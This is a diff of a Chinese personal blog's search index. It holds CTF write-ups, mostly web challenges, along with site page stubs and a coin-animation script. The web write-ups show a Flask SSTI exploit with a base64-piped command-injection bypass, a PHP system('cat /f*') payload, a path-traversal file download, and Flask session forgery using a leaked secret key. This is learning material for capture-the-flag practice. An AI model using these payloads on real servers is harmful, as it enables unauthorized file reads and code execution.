class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hello/&#x27;)</span><br><span class="line">def hello(name=None):</span><br><span class="line">    return render_template(&#x27;hello.html&#x27;,name=name)</span><br><span class="line">@app.route(&#x27;/hello/&lt;name&gt;&#x27;)</span><br><span class="line">def hellodear(name):</span><br><span class="line">    if &quot;ge&quot; in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    elif &quot;f&quot; not in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Nonononon&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进行&#123;&#123;&#125;&#125;测试，发现真是</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195713451.png" alt="image-20240911195713451"></p><blockquote><p>剩下的就是按照笔记那样的步骤一步一步走就行</p><p>重点强调一下如何找&lt;class ‘os._wrap_close’&gt;</p></blockquote><blockquote><p>1.先找到其位置</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200145243.png" alt="image-20240911200145243"></p><blockquote><p>2.查询&lt;class ，再选中&lt;class ‘os._wrap_close’&gt;</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200237432.png" alt="image-20240911200237432"></p><blockquote><p>3.上下查询即可看到第几个。下标就是再-1。这里就是133-1=132.</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200338927.png" alt="image-20240911200338927"></p><blockquote><p>这道题在执行cat /flag命令时会Not Found。</p><p>猜测了一下，应该是将语句中的&quot;/&quot;当成目录了。</p><p>那就试试base64+管道符绕过。</p><p>注意要包一层反引号（命令执行），不然会被当做字符串echo出来。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;cat /fl*&#x27;)替换成(&#x27; ` echo Y2F0IC9mKg== | base64 -d ` &#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>最后得到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200749213.png" alt="image-20240911200749213"></p><h2 id="GDOUCTF-2023-ez-ze">[GDOUCTF 2023]&lt;ez_ze&gt;</h2><blockquote><p>考点：ssti漏洞，fenjing一把梭</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911204933643.png" alt="image-20240911204933643"></p><blockquote><p>输入1111，试试看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911205018866.png" alt="image-20240911205018866"></p><blockquote><p>表面在/get_flag路径下可能存在ssti漏洞。方法是post，变量是name。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911205753411.png" alt="image-20240911205753411"></p><blockquote><p>直接使用fenjing工具拿到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911210006897.png" alt="image-20240911210006897"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911210026354.png" alt="image-20240911210026354"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web-wp </tag>
             
         </tags>
       
@@ -2179,31 +2204,6 @@
     
     
     <entry>
-      <title>刷题2024.7.25</title>
-      <link href="/posts/93f62541.html"/>
-      <url>/posts/93f62541.html</url>
-      
-        <content type="html"><![CDATA[<h2 id="我吐了你随意">我吐了你随意</h2><p>0宽隐写，使用在线工具，将文本复制进去直接得到flag</p><h2 id="迅疾响应">迅疾响应</h2><p>二维码，先用toolfxs里的工具，发现扫不出来，然后用qrazybox在线工具解出。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112855565.png" alt="image-20240725112855565"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112922997.png" alt="image-20240725112922997"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112946131.png" alt="image-20240725112946131"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725113009662.png" alt="image-20240725113009662"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725113030144.png" alt="image-20240725113030144"></p><h2 id="打不开的图片">打不开的图片</h2><p>图片损坏，扔进010editor看看。发现png格式前缀不对，用工具里的求反，然后保存，图片就恢复正常了。</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> misc-wp </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>http协议</title>
       <link href="/posts/54593785.html"/>
       <url>/posts/54593785.html</url>
@@ -2258,6 +2258,31 @@
       <link href="/posts/93f62541.html"/>
       <url>/posts/93f62541.html</url>
       
+        <content type="html"><![CDATA[<h2 id="我吐了你随意">我吐了你随意</h2><p>0宽隐写，使用在线工具，将文本复制进去直接得到flag</p><h2 id="迅疾响应">迅疾响应</h2><p>二维码，先用toolfxs里的工具，发现扫不出来，然后用qrazybox在线工具解出。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112855565.png" alt="image-20240725112855565"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112922997.png" alt="image-20240725112922997"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112946131.png" alt="image-20240725112946131"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725113009662.png" alt="image-20240725113009662"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725113030144.png" alt="image-20240725113030144"></p><h2 id="打不开的图片">打不开的图片</h2><p>图片损坏，扔进010editor看看。发现png格式前缀不对，用工具里的求反，然后保存，图片就恢复正常了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> misc-wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>刷题2024.7.25</title>
+      <link href="/posts/93f62541.html"/>
+      <url>/posts/93f62541.html</url>
+      
         <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web签到">web签到</h2><p>考点：代码审计，http请求</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725125048233.png" alt="image-20240725125048233"></p><p>先传Cookie,即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTFshow-QQ%E7%BE%A4:=a </span><br></pre></td></tr></table></figure><p>​       (中文要进行url编码)</p><p>接下来传post[‘a’]，即a=b</p><p>然后传get[‘b’]，即?b=c</p><p>最后的request，传GET或者POST方法都可以，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725125819297.png" alt="image-20240725125819297"></p><h2 id="web2-c0me-t0-s1gn">web2 c0me_t0_s1gn</h2><p>考点：查看源代码，使用控制台</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725133817711.png" alt="image-20240725133817711"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725133847780.png" alt="image-20240725133847780"></p><h2 id="我的眼里只有￥">我的眼里只有￥</h2><p>考点：代码审计，脚本利用</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725192622896.png" alt="image-20240725192622896"></p><p>_=a,即$__=a,后面就是$a，$a=b,就变成$b，以此类推，用python脚本连续传参可解。</p><h2 id="抽老婆">抽老婆</h2><p>考点：查看源代码，代码审计，flask中的session构造</p><p>打开链接，发现可以下载“老婆“。查看代码，发现一串下载的可以代码。（/download?file=a）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220105916.png" alt="image-20240725220105916"></p><p>用GET方法下载一个文件，发现不成功，页面跳转。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220228045.png" alt="image-20240725220228045"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220311186.png" alt="image-20240725220311186"></p><p>发现”flag“，怀疑/app/app.py文件。下载此文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220413846.png" alt="image-20240725220413846"></p><p>报错，仔细分析，发现可以用…/退级，改为 …/…/app.py，成功下载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># File       : app.py</span><br><span class="line"># Time       ：2022/11/07 09:16</span><br><span class="line"># Author     ：g4_simon</span><br><span class="line"># version    ：python 3.9.7</span><br><span class="line"># Description：抽老婆，哇偶~</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from flask import * # type: ignore</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line">#初始化全局变量</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = &#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():  </span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/getwifi&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def getwifi():</span><br><span class="line">    session[&#x27;isadmin&#x27;]=False</span><br><span class="line">    wifi=random.choice(os.listdir(&#x27;static/img&#x27;))</span><br><span class="line">    session[&#x27;current_wifi&#x27;]=wifi</span><br><span class="line">    return render_template(&#x27;getwifi.html&#x27;,wifi=wifi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/download&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def source(): </span><br><span class="line">    filename=request.args.get(&#x27;file&#x27;)</span><br><span class="line">    if &#x27;flag&#x27; in filename:</span><br><span class="line">        return jsonify(&#123;&quot;msg&quot;:&quot;你想干什么？&quot;&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return send_file(&#x27;static/img/&#x27;+filename,as_attachment=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/secret_path_U_never_know&#x27;,methods=[&#x27;GET&#x27;])</span><br><span class="line">def getflag():</span><br><span class="line">    if session[&#x27;isadmin&#x27;]:</span><br><span class="line">        return jsonify(&#123;&quot;msg&quot;:flag&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&quot;msg&quot;:&quot;你怎么知道这个路径的？不过还好我有身份验证&quot;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析发现，它会根据不同/而调用不同的函数，我们需要使用getflag()函数，输入/secret_path_U_never_know。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220748150.png" alt="image-20240725220748150"></p><p>不行，还要使session[‘isadmin’]为真。（笔记关键词：session）</p><p>用kali机上的flask_session_cookie_manager，先将原session解码，再将isadmin改为True，再编码，替换原session，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725221139596.png" alt="image-20240725221139596"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725221627896.png" alt="image-20240725221627896"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725221646423.png" alt="image-20240725221646423"></p>]]></content>
       
       
@@ -2271,31 +2296,6 @@
         <tags>
             
             <tag> web-wp </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>刷题2024.7.24</title>
-      <link href="/posts/e4f115d7.html"/>
-      <url>/posts/e4f115d7.html</url>
-      
-        <content type="html"><![CDATA[<h2 id="你会异或吗">你会异或吗</h2><p>将文件下载解压放进010editor，发现格式不对，根据题目提示“你会异或吗”和“0x50”，在010editor中对每个字节与0x50进行异或运算，得到完整图片。</p><h2 id="flag一分为二">flag一分为二</h2><p>解压文件是一张png图片，放进010editor，运行模板中的png，在模板结果中找到宽高并修改。之后再用隐形水印工具提取盲水印。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240724183731995.png" alt="image-20240724183731995"></p><h2 id="you-and-me">you_and_me</h2><p>两张图，猜测you.png是原图，you_and_me是加了盲水印的图，需要原图的提取盲水印想到blind watermark。（watermark解不出来）</p><h2 id="黑丝白丝还有什么丝">黑丝白丝还有什么丝</h2><p>视频里按照黑丝白丝出现的顺序和转场变化，依次记录，（白黑黑、白白白白黑、黑白、黑、黑、黑黑黑黑黑、黑白白白、白白白黑黑、黑黑、黑黑黑、白黑白、白、黑白黑白、白白黑、黑、白、白白。最后两个白白应该是拜拜的意思）然后放进</p><p>摩斯密码解密。（多来点这种题（手动滑稽））</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240724224604185.png" alt="image-20240724224604185"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> misc-wp </tag>
             
         </tags>
       
@@ -2321,6 +2321,31 @@
         <tags>
             
             <tag> misc姿势 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>刷题2024.7.24</title>
+      <link href="/posts/e4f115d7.html"/>
+      <url>/posts/e4f115d7.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="你会异或吗">你会异或吗</h2><p>将文件下载解压放进010editor，发现格式不对，根据题目提示“你会异或吗”和“0x50”，在010editor中对每个字节与0x50进行异或运算，得到完整图片。</p><h2 id="flag一分为二">flag一分为二</h2><p>解压文件是一张png图片，放进010editor，运行模板中的png，在模板结果中找到宽高并修改。之后再用隐形水印工具提取盲水印。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240724183731995.png" alt="image-20240724183731995"></p><h2 id="you-and-me">you_and_me</h2><p>两张图，猜测you.png是原图，you_and_me是加了盲水印的图，需要原图的提取盲水印想到blind watermark。（watermark解不出来）</p><h2 id="黑丝白丝还有什么丝">黑丝白丝还有什么丝</h2><p>视频里按照黑丝白丝出现的顺序和转场变化，依次记录，（白黑黑、白白白白黑、黑白、黑、黑、黑黑黑黑黑、黑白白白、白白白黑黑、黑黑、黑黑黑、白黑白、白、黑白黑白、白白黑、黑、白、白白。最后两个白白应该是拜拜的意思）然后放进</p><p>摩斯密码解密。（多来点这种题（手动滑稽））</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240724224604185.png" alt="image-20240724224604185"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> misc-wp </tag>
             
         </tags>
       
@@ -2407,11 +2432,33 @@
     
     
     <entry>
+      <title>分类</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>标签</title>
       <link href="/tags/index.html"/>
       <url>/tags/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/js/coin.js"/>
+      <url>/js/coin.js</url>
+      
+        <content type="html"><![CDATA[var tipButtons = document.querySelectorAll('.tip-button')function coinAudio() {    var coinAudio = document.getElementById("coinAudio");    if (coinAudio) {        coinAudio.play();    }}tipButtons.forEach((button) => {    var coin = button.querySelector('.coin')    coin.maxMoveLoopCount = 90    button.addEventListener('click', () => {        if (/Android|webOS|BlackBerry/i.test(navigator.userAgent)) return true;         if (button.clicked) return        button.classList.add('clicked')        setTimeout(() => {            coin.sideRotationCount = Math.floor(Math.random() * 5) * 90            coin.maxFlipAngle = (Math.floor(Math.random() * 4) + 3) * Math.PI            button.clicked = true            flipCoin()            coinAudio()        }, 50)    })    var flipCoin = () => {        coin.moveLoopCount = 0        flipCoinLoop()    }    var resetCoin = () => {        coin.style.setProperty('--coin-x-multiplier', 0)        coin.style.setProperty('--coin-scale-multiplier', 0)        coin.style.setProperty('--coin-rotation-multiplier', 0)        coin.style.setProperty('--shine-opacity-multiplier', 0.4)        coin.style.setProperty('--shine-bg-multiplier', '50%')        coin.style.setProperty('opacity', 1)        setTimeout(() => {            button.clicked = false        }, 300)    }    var flipCoinLoop = () => {        coin.moveLoopCount++        var percentageCompleted = coin.moveLoopCount / coin.maxMoveLoopCount        coin.angle = -coin.maxFlipAngle * Math.pow((percentageCompleted - 1), 2) + coin.maxFlipAngle        coin.style.setProperty('--coin-y-multiplier', -11 * Math.pow(percentageCompleted * 2 - 1, 4) + 11)        coin.style.setProperty('--coin-x-multiplier', percentageCompleted)        coin.style.setProperty('--coin-scale-multiplier', percentageCompleted * 0.6)        coin.style.setProperty('--coin-rotation-multiplier', percentageCompleted * coin.sideRotationCount)        coin.style.setProperty('--front-scale-multiplier', Math.max(Math.cos(coin.angle), 0))        coin.style.setProperty('--front-y-multiplier', Math.sin(coin.angle))        coin.style.setProperty('--middle-scale-multiplier', Math.abs(Math.cos(coin.angle), 0))        coin.style.setProperty('--middle-y-multiplier', Math.cos((coin.angle + Math.PI / 2) % Math.PI))        coin.style.setProperty('--back-scale-multiplier', Math.max(Math.cos(coin.angle - Math.PI), 0))        coin.style.setProperty('--back-y-multiplier', Math.sin(coin.angle - Math.PI))        coin.style.setProperty('--shine-opacity-multiplier', 4 * Math.sin((coin.angle + Math.PI / 2) % Math.PI) - 3.2)        coin.style.setProperty('--shine-bg-multiplier', -40 * (Math.cos((coin.angle + Math.PI / 2) % Math.PI) - 0.5) + '%')        if (coin.moveLoopCount < coin.maxMoveLoopCount) {            if (coin.moveLoopCount === coin.maxMoveLoopCount - 6) button.classList.add('shrink-landing')            window.requestAnimationFrame(flipCoinLoop)        } else {            button.classList.add('coin-landed')            coin.style.setProperty('opacity', 0)            setTimeout(() => {                button.classList.remove('clicked', 'shrink-landing', 'coin-landed')                setTimeout(() => {                    resetCoin()                }, 300)            }, 1500)        }    }})]]></content>
       
     </entry>
     
@@ -2430,39 +2477,6 @@
     
     <entry>
       <title></title>
-      <link href="/js/coin.js"/>
-      <url>/js/coin.js</url>
-      
-        <content type="html"><![CDATA[var tipButtons = document.querySelectorAll('.tip-button')function coinAudio() {    var coinAudio = document.getElementById("coinAudio");    if (coinAudio) {        coinAudio.play();    }}tipButtons.forEach((button) => {    var coin = button.querySelector('.coin')    coin.maxMoveLoopCount = 90    button.addEventListener('click', () => {        if (/Android|webOS|BlackBerry/i.test(navigator.userAgent)) return true;         if (button.clicked) return        button.classList.add('clicked')        setTimeout(() => {            coin.sideRotationCount = Math.floor(Math.random() * 5) * 90            coin.maxFlipAngle = (Math.floor(Math.random() * 4) + 3) * Math.PI            button.clicked = true            flipCoin()            coinAudio()        }, 50)    })    var flipCoin = () => {        coin.moveLoopCount = 0        flipCoinLoop()    }    var resetCoin = () => {        coin.style.setProperty('--coin-x-multiplier', 0)        coin.style.setProperty('--coin-scale-multiplier', 0)        coin.style.setProperty('--coin-rotation-multiplier', 0)        coin.style.setProperty('--shine-opacity-multiplier', 0.4)        coin.style.setProperty('--shine-bg-multiplier', '50%')        coin.style.setProperty('opacity', 1)        setTimeout(() => {            button.clicked = false        }, 300)    }    var flipCoinLoop = () => {        coin.moveLoopCount++        var percentageCompleted = coin.moveLoopCount / coin.maxMoveLoopCount        coin.angle = -coin.maxFlipAngle * Math.pow((percentageCompleted - 1), 2) + coin.maxFlipAngle        coin.style.setProperty('--coin-y-multiplier', -11 * Math.pow(percentageCompleted * 2 - 1, 4) + 11)        coin.style.setProperty('--coin-x-multiplier', percentageCompleted)        coin.style.setProperty('--coin-scale-multiplier', percentageCompleted * 0.6)        coin.style.setProperty('--coin-rotation-multiplier', percentageCompleted * coin.sideRotationCount)        coin.style.setProperty('--front-scale-multiplier', Math.max(Math.cos(coin.angle), 0))        coin.style.setProperty('--front-y-multiplier', Math.sin(coin.angle))        coin.style.setProperty('--middle-scale-multiplier', Math.abs(Math.cos(coin.angle), 0))        coin.style.setProperty('--middle-y-multiplier', Math.cos((coin.angle + Math.PI / 2) % Math.PI))        coin.style.setProperty('--back-scale-multiplier', Math.max(Math.cos(coin.angle - Math.PI), 0))        coin.style.setProperty('--back-y-multiplier', Math.sin(coin.angle - Math.PI))        coin.style.setProperty('--shine-opacity-multiplier', 4 * Math.sin((coin.angle + Math.PI / 2) % Math.PI) - 3.2)        coin.style.setProperty('--shine-bg-multiplier', -40 * (Math.cos((coin.angle + Math.PI / 2) % Math.PI) - 0.5) + '%')        if (coin.moveLoopCount < coin.maxMoveLoopCount) {            if (coin.moveLoopCount === coin.maxMoveLoopCount - 6) button.classList.add('shrink-landing')            window.requestAnimationFrame(flipCoinLoop)        } else {            button.classList.add('coin-landed')            coin.style.setProperty('opacity', 0)            setTimeout(() => {                button.classList.remove('clicked', 'shrink-landing', 'coin-landed')                setTimeout(() => {                    resetCoin()                }, 300)            }, 1500)        }    }})]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>分类</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>动画</title>
-      <link href="/box/animation/index.html"/>
-      <url>/box/animation/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
       <link href="/owo.json"/>
       <url>/owo.json</url>
       
@@ -2473,44 +2487,11 @@
     
     
     <entry>
-      <title>网址导航</title>
-      <link href="/box/nav/index.html"/>
-      <url>/box/nav/index.html</url>
+      <title>八音盒</title>
+      <link href="/life/music/index.html"/>
+      <url>/life/music/index.html</url>
       
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>画廊</title>
-      <link href="/box/gallery/index.html"/>
-      <url>/box/gallery/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>文章统计</title>
-      <link href="/site/echarts/index.html"/>
-      <url>/site/echarts/index.html</url>
-      
-        <content type="html"><![CDATA[<script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><!-- 文章发布时间统计图 --><div id="posts-chart" data-start="2021-01" style="border-radius: 8px; height: 300px; padding: 10px;"></div><!-- 文章标签统计图 --><div id="tags-chart" data-length="10" style="border-radius: 8px; height: 300px; padding: 10px;"></div><!-- 文章分类统计图 --><div id="categories-chart" data-parent="true" style="border-radius: 8px; height: 300px; padding: 10px;"></div>]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>影院</title>
-      <link href="/life/movies/index.html"/>
-      <url>/life/movies/index.html</url>
-      
-        <content type="html"><![CDATA[<main class="layout" id="content-inner">    <div id="page">        <div id="article-container">            <span class="p center logo h2 blue">                <b>( ＾∀＾）／欢迎光临影院，切换黑夜模式食用效果更佳哦~!＼( ＾∀＾）</b>            </span>    <br>    <br></main>    <details class="folding-tag" blue>    <summary>哔哩哔哩放映厅</summary>        <div class="content">            <div class="tabs" id="room_1">                <ul class="nav-tabs">                    <li class="tab active">                        <button type="button" data-href="#room_1-1">1号厅</button>                    </li>                    <li class="tab">                        <button type="button" data-href="#room_1-2">2号厅</button>                    </li>                    <li class="tab">                        <button type="button" data-href="#room_1-3">3号厅</button>                    </li>                </ul>                <div class="tab-contents">                    <div class="tab-item-content active" id="room_1-1">                        <h3 id="您当前正处于-1-号厅，当前放映的是《冲破黑暗 Out of Darkness》">您当前正处于 1 号厅，当前放映的是《冲破黑暗 Out of Darkness》</h3>                        <div align="center" class="aspect-ratio">                            <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=714997425&bvid=BV1hX4y1g7pp&cid=321134107&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>                        </div>                        <button type="button" class="tab-to-top" aria-label="scroll to top">                            <i class="fas fa-arrow-up"></i>                        </button>                    </div>                    <div class="tab-item-content" id="room_1-2">                        <h3 id="您当前正处于-2-号厅，当前放映的是《记忆管理局》">您当前正处于 2 号厅，当前放映的是《记忆管理局》</h3>                        <div align="center" class="aspect-ratio">                            <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=884758835&bvid=BV1iK4y187Th&cid=240382860&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>                        </div>                        <button type="button" class="tab-to-top" aria-label="scroll to top">                            <i class="fas fa-arrow-up"></i>                        </button>                    </div>                    <div class="tab-item-content" id="room_1-3">                        <h3 id="您当前正处于-3-号厅，当前放映的是《黑盒》">您当前正处于 3 号厅，当前放映的是《黑盒》</h3>                        <div align="center" class="aspect-ratio">                            <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=58854830&bvid=BV1Pt411L7Uo&cid=102606378&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>                        </div>                        <button type="button" class="tab-to-top" aria-label="scroll to top">                            <i class="fas fa-arrow-up"></i>                        </button>                    </div>                    </div>                      </div>        </div></details>]]></content>
+        <content type="html"><![CDATA[<main class="layout" id="content-inner">    <div id="page">        <div id="article-container">            <span class="p center logo h2 blue">                <b>( ＾∀＾）／欢迎光临八音盒，希望舒缓的音乐能带走你一天的疲劳~!＼( ＾∀＾）</b>            </span>    <br>    <br></main>    <blockquote><p>来源：网易云音乐</p></blockquote>    <div id="aplayer-mqmxzRJP" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="12952460159" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="400px" data-preload="none" data-theme="#ad7a86"    ></div><!-- <iframe  frameborder="no" border="0"  marginwidth="0" marginheight="0"  width=530 height=310  src="//activity.kugou.com/share/v-a00a45b0/index.html?u=1045443904&h1=240987975537390846260097417101362365343&h2=483a904874cd4093b4e2381eaea94080&specialid=-2147483648&global_specialid=collection_3_1045443904_16_0&cType=0"></iframe> -->]]></content>
       
     </entry>
     
@@ -2528,11 +2509,22 @@
     
     
     <entry>
-      <title>八音盒</title>
-      <link href="/life/music/index.html"/>
-      <url>/life/music/index.html</url>
+      <title>动画</title>
+      <link href="/box/animation/index.html"/>
+      <url>/box/animation/index.html</url>
       
